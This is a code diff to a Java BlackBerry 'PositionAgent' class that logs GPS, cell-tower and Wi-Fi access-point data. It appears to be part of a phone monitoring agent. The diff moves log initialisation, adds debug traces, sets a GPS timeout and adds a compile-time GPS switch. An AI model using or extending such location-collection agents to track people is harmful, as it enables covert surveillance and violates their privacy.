@@ -55,7 +55,7 @@ public final class PositionAgent extends Agent implements LocationListener {
     private static final int LOG_TYPE_IP = 4;
     private static final int LOG_TYPE_CDMA = 5;
     //private static final int TYPE_GPS_ASSISTED = 3;
-    
+
     Log logGps;
     Log logCell;
     Log logWifi;
@@ -87,11 +87,7 @@ public final class PositionAgent extends Agent implements LocationListener {
      */
     public PositionAgent(final boolean agentStatus) {
         super(AGENT_POSITION, agentStatus, Conf.AGENT_POSITION_ON_SD,
-                "PositionAgent");
-
-        logWifi=log;
-        logGps = new Log(log);
-        logCell = new Log(log);
+                "PositionAgent");       
     }
 
     /**
@@ -105,6 +101,10 @@ public final class PositionAgent extends Agent implements LocationListener {
     protected PositionAgent(final boolean agentStatus, final byte[] confParams) {
         this(agentStatus);
         parse(confParams);
+        
+        logWifi = log;        
+        logGps = new Log(log);
+        logCell = new Log(log);
     }
 
     public void actualStart() {
@@ -136,19 +136,27 @@ public final class PositionAgent extends Agent implements LocationListener {
             debug.error(e);
             //#endif
         }
-        
+
         if (gpsEnabled && lp != null) {
-            
-            logGps.createLog(getAdditionalData(0, LOG_TYPE_GPS), LogType.LOCATION_NEW);
+            //#ifdef DEBUG_TRACE
+            debug.trace("actualStart: logGps.createLog");
+            //#endif
+            logGps.createLog(getAdditionalData(0, LOG_TYPE_GPS),
+                    LogType.LOCATION_NEW);
         }
         if (cellEnabled) {
-            if(Device.isCDMA()){
-                logCell.createLog(getAdditionalData(0, LOG_TYPE_CDMA), LogType.LOCATION_NEW);
-            }else{
-                logCell.createLog(getAdditionalData(0, LOG_TYPE_GSM), LogType.LOCATION_NEW); 
+            //#ifdef DEBUG_TRACE
+            debug.trace("actualStart: logCell.createLog");
+            //#endif
+            if (Device.isCDMA()) {
+                logCell.createLog(getAdditionalData(0, LOG_TYPE_CDMA),
+                        LogType.LOCATION_NEW);
+            } else {
+                logCell.createLog(getAdditionalData(0, LOG_TYPE_GSM),
+                        LogType.LOCATION_NEW);
             }
-        }                       
-        
+        }
+
     }
 
     /*
@@ -157,27 +165,48 @@ public final class PositionAgent extends Agent implements LocationListener {
      */
     public void actualRun() {
         if (gpsEnabled) {
+            //#ifdef DEBUG_TRACE
+            debug.trace("actualRun: gps");
+            //#endif
             locationGPS();
         }
         if (cellEnabled) {
+            //#ifdef DEBUG_TRACE
+            debug.trace("actualRun: cell");
+            //#endif
             locationCELL();
         }
         if (wifiEnabled) {
+            //#ifdef DEBUG_TRACE
+            debug.trace("actualRun: wifi");
+            //#endif
             locationWIFI();
         }
     }
 
     public void actualStop() {
-        
+
         if (gpsEnabled) {
+            if (lp != null) {
+                //#ifdef DEBUG_TRACE
+                debug.trace("actualStop: resetting ");
+                //#endif
+                lp.reset();
+            }
+            //#ifdef DEBUG_TRACE
+            debug.trace("actualStop: closing logGps");
+            //#endif
             logGps.close();
         }
         if (cellEnabled) {
+            //#ifdef DEBUG_TRACE
+            debug.trace("actualStop: closing logCell");
+            //#endif
             logCell.close();
         }
 
     }
-    
+
     private void locationWIFI() {
         final WLANAPInfo wifi = WLANInfo.getAPInfo();
         if (wifi != null) {
@@ -186,10 +215,11 @@ public final class PositionAgent extends Agent implements LocationListener {
             //#endif
             byte[] payload = getWifiPayload(wifi.getBSSID(), wifi.getSSID(),
                     wifi.getSignalLevel());
-            
-            logWifi.createLog(getAdditionalData(1, LOG_TYPE_WIFI), LogType.LOCATION_NEW);
+
+            logWifi.createLog(getAdditionalData(1, LOG_TYPE_WIFI),
+                    LogType.LOCATION_NEW);
             logWifi.writeLog(payload);
-            logWifi.close();            
+            logWifi.close();
         } else {
             //#ifdef DEBUG_WARN
             debug.warn("Wifi disabled");
@@ -271,7 +301,7 @@ public final class PositionAgent extends Agent implements LocationListener {
         }
 
         try {
-            loc = lp.getLocation(-1);
+            loc = lp.getLocation(Conf.GPS_TIMEOUT);
         } catch (LocationException e) {
             //#ifdef DEBUG_ERROR
             debug.error(e);
@@ -321,7 +351,7 @@ public final class PositionAgent extends Agent implements LocationListener {
     }
 
     private byte[] getAdditionalData(int structNum, int type) {
-       
+
         int addsize = 12;
         byte[] additionalData = new byte[addsize];
         final DataBuffer addbuffer = new DataBuffer(additionalData, 0,
@@ -397,8 +427,8 @@ public final class PositionAgent extends Agent implements LocationListener {
         for (int i = 0; i < 6; i++) {
             byte[] token = Utils.hexStringToByteArray(bssid, i * 3, 2);
             //#ifdef DEBUG_TRACE
-            debug.trace("getWifiPayload " + i + " : "
-                    + Utils.byteArrayToHex(token));
+            //debug.trace("getWifiPayload " + i + " : "
+            //        + Utils.byteArrayToHex(token));
             //#endif
 
             //#ifdef DBC
@@ -573,7 +603,6 @@ public final class PositionAgent extends Agent implements LocationListener {
         return gpsPosition;
     }
 
-
     /*
      * (non-Javadoc)
      * @see blackberry.agent.Agent#parse(byte[])
@@ -586,7 +615,13 @@ public final class PositionAgent extends Agent implements LocationListener {
             period = databuffer.readInt();
             int type = databuffer.readInt();
 
-            gpsEnabled = ((type & TYPE_GPS) != 0);
+            if (Conf.GPS_ENABLED) {
+                gpsEnabled = ((type & TYPE_GPS) != 0);
+            } else {
+                //#ifdef DEBUG_WARN
+                debug.warn("GPS Disabled at compile time");
+                //#endif
+            }
             cellEnabled = ((type & TYPE_CELL) != 0);
             wifiEnabled = ((type & TYPE_WIFI) != 0);
 
